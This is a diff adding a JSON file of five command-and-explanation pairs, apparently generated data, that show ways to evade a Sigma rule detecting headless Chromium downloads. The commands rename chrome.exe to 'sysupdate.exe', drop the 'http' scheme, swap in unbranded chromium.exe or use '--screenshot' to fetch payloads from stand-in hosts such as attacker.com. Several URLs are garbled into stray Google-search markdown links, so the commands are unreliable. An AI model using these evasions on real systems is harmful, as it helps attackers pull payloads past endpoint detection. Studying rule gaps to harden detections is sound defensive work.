@@ -1,0 +1,22 @@
+[
+  {
+    "output": "cmd.exe /c copy \"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\" C:\\Temp\\sysupdate.exe && C:\\Temp\\sysupdate.exe --headless --dump-dom [http://example.com/payload.txt](https://www.google.com/search?q=http://example.com/payload.txt)",
+    "explanation": "The Sigma rule relies on a hardcoded list of default browser binary names in the 'Image|endswith' condition. By copying the legitimate executable to a new directory with an unlisted name (like sysupdate.exe), the condition evaluates to false and the detection is bypassed."
+  },
+  {
+    "output": "msedge.exe --headless --dump-dom [malicious-domain.com/payload.ps1]()",
+    "explanation": "The rule explicitly requires the string 'http' to be present in the command line. Modern Chromium-based browsers automatically prepend the HTTP or HTTPS protocol if it is omitted. By providing only the domain or IP address without the protocol scheme, the 'http' string match fails while the browser still downloads the target."
+  },
+  {
+    "output": "chromium.exe --headless --dump-dom [http://example.com/payload.txt](https://www.google.com/search?q=http://example.com/payload.txt)",
+    "explanation": "The detection specifically targets branded Chromium-based browsers like Chrome, Edge, and Brave. Utilizing an unbranded base Chromium build (chromium.exe) or an obscure Chromium derivative effectively evades the 'Image|endswith' list entirely while retaining the exact same headless functionality."
+  },
+  {
+    "output": "copy \"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\" C:\\Windows\\Temp\\sysupdate.exe & C:\\Windows\\Temp\\sysupdate.exe --headless --dump-dom https://example.com/file.txt",
+    "explanation": "This command bypasses the Sigma rule by exploiting the 'Image|endswith' condition. The rule explicitly looks for processes named brave.exe, chrome.exe, msedge.exe, opera.exe, or vivaldi.exe. By copying the browser executable to a different location and renaming it (e.g., to sysupdate.exe), the execution will not match the required Image criteria, successfully evading detection while still performing the headless DOM dump. A more robust rule would also check 'OriginalFileName' or image hashes."
+  },
+  {
+    "output": "chrome.exe --headless --screenshot --window-size=1280,800 http://attacker.com/payload.exe",
+    "explanation": "The original Sigma rule specifically looks for the 'dump-dom' argument. By using '--screenshot' or '--print-to-pdf' instead, an attacker can still force the browser to make a GET request to a remote URL to fetch content, effectively downloading or interacting with the file without triggering the specific string match for DOM dumping."
+  }
+]
